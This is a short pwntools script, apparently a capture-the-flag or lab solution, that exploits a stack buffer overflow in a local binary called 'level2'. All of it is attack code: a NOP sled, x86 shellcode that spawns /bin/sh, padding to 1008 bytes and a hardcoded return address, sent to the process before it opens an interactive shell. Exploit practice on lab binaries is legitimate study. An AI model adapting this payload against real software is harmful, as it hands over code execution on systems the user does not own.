from pwn import *

context.log_level = 'debug'
context.local(endian='big')

length_to_override = 1008
shellcode = "\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80"
nopsled = "\x90"*200
return_to_shellcode = "\xdc\xc7\xff\xff"
payload = nopsled + shellcode + "A"*(length_to_override - len(nopsled+shellcode)) + return_to_shellcode


p = process("./level2")
p.recvuntil("read 3000 bytes this time.\n", timeout=0)
pause()

p.sendline(payload)

p.interactive()
#p.recvall()
